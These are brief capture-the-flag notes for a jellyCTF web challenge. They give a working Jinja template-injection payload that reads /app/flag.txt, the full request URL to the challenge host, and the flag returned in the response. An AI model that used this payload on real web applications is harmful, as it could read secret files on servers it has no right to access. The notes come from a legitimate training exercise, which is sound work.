# [web] bro_visited_his_site_2

<table><tbody>
<tr><th>Value</th><td>453 pts</td></tr>
<tr><th>Tags</th><td><code>easy</code></td></tr>
<tr><th>Author</th><td>arepi</td></tr>
<tr><th>Connection info</th><td><a href="https://bro-visited-his-site.jellyc.tf/">https://bro-visited-his-site.jellyc.tf/</a></td></tr>
</tbody></table>

ok, but can you get /app/flag.txt

note: this is not the flask secret - that's the first bro_visited_his_site

20 point hint: list of techniques for the vuln class

---

raw notes:

  - can leverage same attack vector as [[web] bro_visited_his_site](../bro_visited_his_site/README.md)
  - `url_for.__globals__.__builtins__.open('/app/flag.txt').read()`
  - <https://bro-visited-his-site.jellyc.tf/response?word={{%20url_for.__globals__.__builtins__.open(%27/app/flag.txt%27).read()%20}}> ([archived](./response.html)):
    ```html
                <p>
                    jellyCTF{rc3p1lled_t3mpl4te_1nj3ct10nmaxx3r}pilled jellyCTF{rc3p1lled_t3mpl4te_1nj3ct10nmaxx3r}maxxer
                </p>
    ```
